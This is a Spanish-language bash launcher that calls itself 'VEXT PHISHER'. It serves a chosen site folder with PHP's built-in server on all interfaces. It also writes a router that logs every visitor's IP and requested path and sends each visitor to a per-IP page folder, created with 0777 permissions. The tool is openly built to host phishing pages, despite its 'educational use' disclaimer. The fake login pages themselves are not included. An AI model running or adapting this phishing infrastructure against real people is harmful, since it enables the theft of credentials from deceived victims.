#!/bin/bash

trap 'printf "\n\n${ROJO}[!] Deteniendo servicios y saliendo...${RESET}\n"; killall php > /dev/null 2>&1; exit' SIGINT

VERDE='\033[0;32m'
ROJO='\033[0;31m'
AMARILLO='\033[1;33m'
AZUL='\033[0;34m'
CIAN='\033[0;36m'
RESET='\033[0m'

banner() {
    clear
    echo -e "${AZUL}====================================================${RESET}"
    echo -e "${CIAN} __     _________  _______   ____  _   _ ___ ____  _   _ _____ ____  ${RESET}"
    echo -e "${CIAN} \\ \\   / / ____\\ \\/ /_   _| |  _ \\| | | |_ _/ ___|| | | | ____|  _ \\ ${RESET}"
    echo -e "${CIAN}  \\ \\ / /|  _|  \\  /  | |   | |_) | |_| || |\\___ \\| |_| |  _| | |_) |${RESET}"
    echo -e "${CIAN}   \\ V / | |___ /  \\  | |   |  __/|  _  || | ___) |  _  | |___|  _ < ${RESET}"
    echo -e "${CIAN}    \\_/  |_____/_/\\_\\ |_|   |_|   |_| |_|___|____/|_| |_|_____|_| \\_\\${RESET}"
    echo -e "${VERDE}                         By Vextu Android                ${RESET}   "
    echo -e "${AZUL}====================================================${RESET}"
    echo -e "${ROJO} ADVERTENCIA: Esta herramienta es solo para fines${RESET}"
    echo -e "${ROJO} educativos y pruebas de penetración autorizadas.${RESET}"
    echo -e "${ROJO} El uso indebido es responsabilidad del usuario.${RESET}"
    echo -e "${AZUL}----------------------------------------------------${RESET}"
}

if [ ! -d "sites" ]; then
    echo -e "${ROJO}[!] Error: La carpeta /sites/ no existe.${RESET}"
    exit 1
fi

banner

echo -e "${AMARILLO}[+] Selecciona un sitio disponible:${RESET}"
opciones=($(ls sites/))
for i in "${!opciones[@]}"; do
    echo -e "${VERDE}$((i+1)))${RESET} ${opciones[$i]}"
done

echo -e "${AZUL}----------------------------------------------------${RESET}"
read -p "Seleccion: " seleccion

index=$((seleccion-1))
if [[ $seleccion -lt 1 || $seleccion -gt ${#opciones[@]} ]]; then
    echo -e "${ROJO}[!] Seleccion invalida.${RESET}"
    exit 1
fi

sitio=${opciones[$index]}

read -p "Puerto (Defecto 8080): " puerto
puerto=${puerto:-8080}

cat <<EOF > sites/$sitio/router.php
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$uri = \$_SERVER['REQUEST_URI'];
\$log_file = __DIR__ . "/access_log.txt";

if (!file_exists(__DIR__ . "/\$ip")) {
    mkdir(__DIR__ . "/\$ip", 0777, true);
}

\$log_entry = date('Y-m-d H:i:s') . " | IP: \$ip | URI: \$uri\n";
file_put_contents(\$log_file, \$log_entry, FILE_APPEND);

if (\$uri == '/' || \$uri == '') {
    if (file_exists(__DIR__ . "/\$ip/index.html")) {
        header("Location: /\$ip/index.html");
        exit;
    } elseif (file_exists(__DIR__ . "/\$ip/index.php")) {
        header("Location: /\$ip/index.php");
        exit;
    } else {
        echo "<body style='background:#000;color:#f00;font-family:monospace;'>";
        echo "<h1>404 - Estructura no encontrada</h1>";
        echo "<p>Falta index en: sites/$sitio/\$ip/</p>";
        echo "</body>";
        exit;
    }
}
return false;
?>
EOF

echo -e "\n${AMARILLO}[*] Configurando entorno...${RESET}"
sleep 1
echo -e "${VERDE}[OK] Servidor iniciado correctamente.${RESET}"
echo -e "${CIAN}[i] URL Local: http://127.0.0.1:$puerto${RESET}"
echo -e "${CIAN}[i] Carpeta activa: sites/$sitio/${RESET}"
echo -e "${AMARILLO}[!] Esperando conexiones... (Ctrl+C para cerrar)${RESET}\n"

cd sites/$sitio
php -S 0.0.0.0:$puerto router.php
